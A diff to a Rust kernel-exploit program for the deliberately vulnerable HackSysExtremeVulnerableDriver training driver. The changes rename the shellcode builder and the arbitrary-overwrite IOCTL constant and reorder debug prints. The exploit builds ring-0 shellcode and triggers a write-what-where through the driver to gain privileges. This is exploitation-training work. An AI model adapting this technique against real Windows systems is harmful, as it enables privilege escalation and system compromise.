@@ -1,9 +1,9 @@
 use std::{ffi::c_void, mem::size_of};
 
 use exploitation::{
-    build_payload, get_device_handle, get_driver_base_address, get_function_address_by_name,
+    build_shellcode, get_device_handle, get_driver_base_address, get_function_address_by_name,
     is_elevated, send_io_control, spawn_shell, trigger_payload, DEVICE_NAME,
-    IOCTL_ARBITRARY_OVERWRITE,
+    HEVD_IOCTL_ARBITRARY_OVERWRITE,
 };
 
 #[derive(Debug, Clone, Copy)]
@@ -19,7 +19,7 @@ fn main() {
     println!("[+] Preparing Ring0 Payload");
 
     /* Generate payload */
-    let ring0_payload_addy = match build_payload() {
+    let ring0_payload_addy = match build_shellcode() {
         Ok(payload) => payload,
         Err(e) => panic!("[-] Failed to setup payload: {}", e),
     };
@@ -89,7 +89,7 @@ fn main() {
 
     /* Get a handle to the vulnerable kernel driver */
     println!("[+] Opening Vulnerable Device: {}", DEVICE_NAME);
-    let device_handle = match get_device_handle("\\\\.\\HackSysExtremeVulnerableDriver") {
+    let device_handle = match get_device_handle(DEVICE_NAME) {
         Ok(handle) => handle,
         Err(e) => panic!("[-] Failed to get device handle: {}", e),
     };
@@ -97,13 +97,13 @@ fn main() {
 
     /* Send the control code with buffer to the vulnerable driver */
     println!("[+] Triggering Arbitrary Memory Overwrite");
-    println!("\t[*] Sending IOCTL Code: {:#x}", IOCTL_ARBITRARY_OVERWRITE);
-    println!("\t[*] Buffer Length: {}", buffer_size);
     println!("\t[*] Buffer: {:?}", write_what_where);
+    println!("\t[*] Buffer Length: {}", buffer_size);
+    println!("\t[*] Sending IOCTL Code: {:#x}", *HEVD_IOCTL_ARBITRARY_OVERWRITE);
 
     match send_io_control(
         device_handle,
-        IOCTL_ARBITRARY_OVERWRITE,
+        *HEVD_IOCTL_ARBITRARY_OVERWRITE,
         write_what_where_ptr as _,
         buffer_size,
     ) {
